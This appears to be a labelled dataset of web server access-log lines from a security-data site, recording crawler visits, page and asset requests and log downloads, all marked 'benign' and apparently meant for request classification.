+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/dns.html HTTP/1.1 STATUS=200 BYTES=1837 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=200 BYTES=391 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49133 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/?C=S;O=D HTTP/1.1 STATUS=200 BYTES=783 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET /self.logs/2016/ HTTP/1.1 STATUS=200 BYTES=7860 UA=""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36""",benign
+"GET /self.logs/access.log.2021-10-18.gz HTTP/1.1 STATUS=200 BYTES=11487 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET /self.logs/error.log.2021-10-18.gz HTTP/1.1 STATUS=200 BYTES=4844 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /Datasets Description/PE_malware/VirusShare.html HTTP/1.1 STATUS=200 BYTES=1651 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Google-PageRenderer Google (+https://developers.google.com/+/web/snippet/)""",benign
+"GET /self.logs/error.log.2019-04-23.gz HTTP/1.1 STATUS=304 BYTES=280 UA=""Mozilla/4.0 (compatible;)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/dns.html HTTP/1.1 STATUS=200 BYTES=1837 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"GET /Datasets HTTP/1.1 STATUS=404 BYTES=291 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"GET /honeypot/Honeypot HTTP/1.1 STATUS=404 BYTES=291 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"GET /self.logs/ HTTP/1.1 STATUS=200 BYTES=32338 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"GET /honeypot/BSidesDFW HTTP/1.1 STATUS=404 BYTES=291 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"GET /self.logs/?C=N;O=D HTTP/1.1 STATUS=200 BYTES=33064 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"GET /self.logs/error.log.2020-06-14 HTTP/1.1 STATUS=200 BYTES=314 UA=""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7533 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36""",benign
+"GET /wordpress/ HTTP/1.1 STATUS=301 BYTES=439 UA=""-""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /Datasets Description/HTML_Bro_log_3 HTTP/1.1 STATUS=301 BYTES=582 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/dns.html HTTP/1.1 STATUS=200 BYTES=1506 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/ftp.html HTTP/1.1 STATUS=200 BYTES=1493 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /Datasets Description/Network/ssh.html HTTP/1.1 STATUS=200 BYTES=1331 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/ssl.html HTTP/1.1 STATUS=200 BYTES=1548 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/dhcp.html HTTP/1.1 STATUS=200 BYTES=1424 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /Datasets Description/Network/http.html HTTP/1.1 STATUS=200 BYTES=1672 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/smtp.html HTTP/1.1 STATUS=200 BYTES=1600 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/files.html HTTP/1.1 STATUS=200 BYTES=1495 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/weird.html HTTP/1.1 STATUS=200 BYTES=1608 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/notice.html HTTP/1.1 STATUS=200 BYTES=1613 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/tunnel.html HTTP/1.1 STATUS=200 BYTES=1433 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/Zeus.html HTTP/1.1 STATUS=200 BYTES=1661 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/signatures.html HTTP/1.1 STATUS=404 BYTES=291 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/OPCleaver.html HTTP/1.1 STATUS=200 BYTES=1421 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/PE_malware/VirusShare.html HTTP/1.1 STATUS=200 BYTES=1614 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/Network/N/A HTTP/1.1 STATUS=404 BYTES=291 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/HTML_Bro_log_1/ HTTP/1.1 STATUS=200 BYTES=797 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/ HTTP/1.1 STATUS=200 BYTES=795 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET /Datasets Description/HTML_Bro_log_3/ HTTP/1.1 STATUS=200 BYTES=786 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (compatible; Adsbot/3.1; +https://seostar.co/robot/)""",benign
+"GET / HTTP/1.0 STATUS=200 BYTES=49096 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13149 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=438 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13148 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=340 UA=""Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)""",benign
+"GET /Datasets Description/HTML_Bro_log_2/dns.html HTTP/1.1 STATUS=200 BYTES=1794 UA=""Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13150 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /self.logs/ HTTP/1.1 STATUS=200 BYTES=32375 REF=""https://www.google.com/"" UA=""Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.73""",benign
+"GET /favicon.ico HTTP/1.1 STATUS=200 BYTES=368 REF=""http://www.secrepo.com/self.logs/"" UA=""Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.73""",benign
+"GET /self.logs/access.log.2017-01-08.gz HTTP/1.1 STATUS=200 BYTES=14947 REF=""http://www.secrepo.com/self.logs/"" UA=""Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.73""",benign
+"GET /self.logs/error.log.2021-10-02.gz HTTP/1.1 STATUS=200 BYTES=2761 REF=""http://www.secrepo.com/self.logs/"" UA=""Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.73""",benign
+"GET /self.logs/error.log.2021-07-03 HTTP/1.1 STATUS=200 BYTES=5339 REF=""http://www.secrepo.com/self.logs/"" UA=""Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.73""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13150 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13187 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27893 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7533 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13150 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1 STATUS=200 BYTES=170820 UA=""Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=333 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13143 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13150 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 REF=""https://izhpnevmo.ru/"" UA=""Opera/9.0 (Windows NT 5.1; U; en)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 REF=""https://izhpnevmo.ru/"" UA=""Opera/9.0 (Windows NT 5.1; U; en)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49089 REF=""https://izhpnevmo.ru/"" UA=""Opera/9.0 (Windows NT 5.1; U; en)""",benign
+"GET /robots.txt HTTP/1.1 STATUS=301 BYTES=439 UA=""Twitterbot/1.0""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=333 UA=""Twitterbot/1.0""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=419 UA=""Twitterbot/1.0""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=333 UA=""Twitterbot/1.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13109 UA=""Twitterbot/1.0""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13143 UA=""Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)""",benign
+"GET /Datasets Description/PE_malware/VirusShare.html HTTP/1.1 STATUS=200 BYTES=1651 UA=""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Google-PageRenderer Google (+https://developers.google.com/+/web/snippet/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13150 UA=""Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"GET /data HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"GET /ftp://download.iwlab.foi.se/dataset/ HTTP/1.1 STATUS=404 BYTES=328 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13186 REF=""http://secrepo.com"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1 STATUS=200 BYTES=1633740 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=301 BYTES=475 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13187 UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27916 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7556 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=13187 UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /css/style.css HTTP/1.1 STATUS=404 BYTES=305 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /GitHub-Mark.png HTTP/1.1 STATUS=200 BYTES=7533 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /twitter-icon.png HTTP/1.1 STATUS=200 BYTES=27893 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /bootstrap/img/favicon.ico HTTP/1.1 STATUS=200 BYTES=690 REF=""http://www.secrepo.com/"" UA=""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36""",benign
+"GET /Datasets Description/HTML_Bro_log_3/?C=S;O=D HTTP/1.1 STATUS=200 BYTES=775 UA=""Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)""",benign
+"GET / HTTP/1.1 STATUS=200 BYTES=49096 REF=""http://odinon.ru/"" UA=""Re-re Studio (+http://vip0.ru/)""",benign
+"GET /e/data/js/ajax.js HTTP/1.1 STATUS=404 BYTES=328 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0""",benign
+"GET /robots.txt HTTP/1.1 STATUS=200 BYTES=377 UA=""Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0""",benign
